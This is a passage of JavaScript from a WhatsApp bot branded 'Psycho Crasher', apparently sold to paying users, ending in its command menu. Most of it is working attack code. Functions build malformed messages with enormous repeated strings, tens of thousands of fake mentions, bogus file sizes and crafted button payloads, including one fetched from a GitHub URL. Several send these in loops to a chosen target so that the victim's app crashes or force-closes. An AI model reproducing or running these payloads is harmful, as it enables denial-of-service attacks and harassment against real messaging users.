                    title: "𝑫͢𝒊𝒕͠𝒄𝒉͜͡𝒊𝒆͎𝑴͢𝒐͡𝒅𝒔̤",
                    hasMediaAttachment: false
                },
                body: {
                        text: "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹ꦾ".repeat(90000) + "@8".repeat(90000),
                },
              nativeFlowMessage: {
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "payment_method",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999),
                  voice_call: "call_galaxy"
                }, {
                  name: "form_message",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "wa_payment_learn_more",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "wa_payment_fbpin_reset",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "catalog_message",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "payment_info",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "review_order",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "send_location",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "payments_care_csat",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "view_product",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "payment_settings",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "address_message",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "automated_greeting_message_view_catalog",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "open_webview",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "message_with_link_status",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "payment_status",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "galaxy_costum",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "extensions_message_v2",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "landline_call",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "mpm",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "cta_copy",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "cta_url",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                }, {
                  name: "cta_call",
                  buttonParamsJson: venomModsData + "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹".repeat(99999)
                  }]
                }
            }
        },
        { participant: { jid: target } }
    );
}
async function VampPrivateBlank(FadelSM, target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Lalapo Bot",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await FadelSM.relayMessage(target, message, { participant: { jid: target } });
}
async function VampHardUi(target, Ptcp = false) {
    FadelSM.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹" + "ꦽ".repeat(92000) + "꧀".repeat(92000) + '@5'.repeat(92000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function HFC(target, Vkys, Amount, ptcp = true) {
  const Vdata = "*我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️*"
  
   let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        hasMediaAttachment: false
       },
       body: {
        text: "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹" + "ꦾ".repeat(Amount),
       },
       nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [{
          name: "single_select",
          buttonParamsJson: Vdata + "\u0000"
         },
         {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
         {
          name: "call_permission_request",
          buttonParamsJson: Vdata + "𝑫͢𝒊𝒕͠𝒄𝒉͜͡𝒊𝒆͎𝑴͢𝒐͡𝒅𝒔̤⚡"
         },
        ]
       }
      }
     }
    }
   }, {
    userJid: target,
    quoted: Vkys
   });
            await FadelSM.relayMessage(target, msg.message, ptcp ? {
    participant: {
     jid: target
    }
   } : {});     
   console.log(chalk.green("𝗙𝗖 𝗦𝗘𝗡𝗗 𝗕𝗬 😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹"));
}
async function VampireNewSticker(target) {
    try {
        const message = {
            stickerPackMessage: {
                stickerPackId: "2a020f9c-4701-4a19-8a05-358e5f50706b",
                name: "ꦾ".repeat(10000),
                publisher: "ꦽ".repeat(500),
                stickers: [
                    {
                        fileName: "SkhRT09I4+K+pKVF3najiKZMW4AHBdeaUCwriuT-isk=.webp",
                        isAnimated: false,
                        emojis: [""],
                        mimetype: "image/webp"
                    }
                ],
                fileLength: "99999999",
                fileSha256: "1aYtTgzj90li3Zjl3iqT8qYc33giu9r2XQ2VfvXj6qI=",
                fileEncSha256: "KqlacQ4p7TypiMFnpZxrqWFnP/RJTw5LrEe6Q8BdEV0=",
                mediaKey: "vynzOrLOfRJKq5FR2IO+GiQYWimtLdM2QOMxCLx9W1I=",
                directPath: "/v/t62.15575-24/19152401_2707159986150301_6253013717572687839_n.enc",
                mediaKeyTimestamp: "1741245862",
                trayIconFileName: "2a020f9c-4701-4a19-8a05-358e5f50706b.png",
                stickerPackSize: "99999999"
            }
        };

        await FadelSM.sendMessage(target, message, { quoted: null });
        console.log(`😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 SEND BUG WKWK ${target}!`);
    } catch (error) {
        console.error("Error 😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹:", error);
    }
}
async function GxhorseForceClose(target) {
for (let r = 0; r < 666; r++) {  
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "Kontol",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "t.me/Fya_zuroku",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Zuroku - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );
  await FadelSM.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
await sleep(5000) // memberikan efek jeda selama 5 detik
console.log("저스틴𝔲𝔦 𝔖𝔶𝔰𝔱𝔢𝔪𝔞𝔱𝔦𝔠巛⚰︎⃟⃟😨")
}
}

async function PukiMay(target) {
  try {
    let pesan = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: " んすぐに助けてくださいメタシステムさんありがとうございま"
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "null",
                header: " んすぐに助けてくださいメタシステムさんありがとうございま",
                body: ""
              }),
              buttons: []
            },
            contextInfo: {
              mentionedJid: [target],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    }, {
      quoted: hah
    });
    await FadelSM.relayMessage(target, pesan.message, jids ? {
      participant: {
        jid: target,
        messageId: pesan.key.id
      }
    } : {});
    console.log(chalk.blue(" success send bug "));
    
    // Tambahkan kode iOs Old
    await FadelSM.relayMessage(target, {
      "paymentInviteMessage": {
        serviceType: "FBPAY",
        expiryTimestamp: Date.now() + 1814400000
      }
    }, {
      participant: {
        jid: target
      }
    });
    
    // Tambahkan kode Call Old
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {},
              hasMediaAttachment: true
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              name: "call_permission_request",
              messageParamsJson: ""
            },
            carouselMessage: {}
          }
        }
      }
    }), {
      userJid: target,
      quoted: hah
    });
    await FadelSM.relayMessage(target, etc.message, {
      participant: {
        jid: target
      }
    });
    
    // Tambahkan kode iOs New
    await FadelSM.relayMessage(target, {
      'extendedTextMessage': {
        'text': '.',
        'contextInfo': {
          'stanzaId': target,
          'participant': target,
          'quotedMessage': {
            'conversation': '  バ GalaXyy Crashh グ ' + 'ꦾ'.repeat(50000)
          },
          'disappearingMode': {
            'initiator': "CHANGED_IN_CHAT",
            'trigger': "CHAT_SETTING"
          }
        },
        'inviteLinkGroupTypeV2': "DEFAULT"
      }
    }, {
      'participant': {
        'jid': target
      }
    }, {
      'messageId': null
    });
    
    // Tambahkan kode FlowX
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " んすぐに助けてくださいメタシステムさんありがとうございま",
              hasMediaAttachment: false,
            },
            body: {
              text: " んすぐに助けてくださいメタシステムさんありがとうございま",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          }
        }
      }
    }, {});
    await FadelSM.relayMessage(target, msg.message, {
      participant: {
        jid: target
      }
    });
  } catch (error) {
    console.error('Error:', error);
  }
}

async function SpaceGroup(target) {
if (!target.includes("@s.whatsapp.net") && !target.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", target);
return;
}

let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "😨𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "𝔨𝔦𝔩𝔩𝔢𝔯𝔥𝔬𝔯𝔰𝔢 ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
},
},
},
};
for (let i = 0; i < 10; i++) {  
try {
await FadelSM.relayMessage(target, Msg, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break; 
}
}
}



// FC COMBO
async function ForceCloseUiX(target) {
for (let i = 0; i < 10; i++) {
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
await GxhorseForceClose(target);
}
}







// function racikan FadelSM
async function OverflowPayload(target, mention = false, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await FadelSM.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await FadelSM.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar target
        await new Promise(res => setTimeout(res, delayMs));
    }
}

async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  𝑷𝑺𝒀𝑪𝑯𝑶 - 𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝟰\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await FadelSM.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await FadelSM.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ PSYCHO VIEWONCE BUG V2.1" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𝑷𝑺𝒀𝑪𝑯𝑶 𝑪𝑹𝑨𝑺𝑯𝑬𝑹",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "🔥 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠 🦠ɳσ Ꮳσυ⚡ɳƚҽɾ ⚡"
                        }
                    },
                    description: "🔥🦠 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠 🦠ɳσ ⚡Ꮳσυɳƚҽɾ ⚡"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await FadelSM.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}
 
 let apiClient;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

FadelSM.newsletterFollow("120363417146796862@newsletter");
FadelSM.newsletterFollow("120363309802495518@newsletter");
FadelSM.newsletterFollow("120363417146796862@newsletter");
FadelSM.newsletterFollow("120363309802495518@newsletter");
FadelSM.newsletterFollow("120363310265328708@newsletter");
FadelSM.newsletterFollow("120363366649033016@newsletter");
FadelSM.newsletterFollow("120363400516938325@newsletter");
FadelSM.newsletterFollow("120363400738305381@newsletter");
FadelSM.newsletterFollow("120363393416418292@newsletter");
FadelSM.newsletterFollow("120363419150399788@newsletter");
FadelSM.newsletterFollow("120363354576718458@newsletter");
FadelSM.newsletterFollow("120363400321841558@newsletter");
FadelSM.newsletterFollow("120363400894614613@newsletter");
FadelSM.newsletterFollow("120363334353222571@newsletter");
FadelSM.newsletterFollow("120363402246418667@newsletter");
FadelSM.newsletterFollow("120363400899679923@newsletter");
    
async function reply(teks) {
FadelSM.sendMessage(m.chat, {
text: teks,
mentions: FadelSM.ments(teks),
isForwarded: true
}, {quoted: m})
}
// Command handler
switch (command) {
//CASE MENU
case "menu": case "psychocrasher": {
let Menu = `
> [ ⼢ ] 𝗛𝗶 𝗞𝗼𝗻𝗻𝗶𝗰𝗵𝗶𝘄𝗮, 👋 ${pushname} 𝗢𝗵𝗮𝘆𝗼𝗼 🕊

\`🧸 𝗣 𝗦 𝗬 𝗖 𝗛 𝗢 𝐂 𝐑 𝐀 𝐒 𝐇\` 
╭━⊱ ⧼ 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠 ⧽
┃𝜩 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝗙𝗮𝗱𝗲𝗹 𝗦͜͢𝗠
┃𝜩 Time : ${ucapanWaktu}
┃𝜩 Status : Vip Buy Only! 
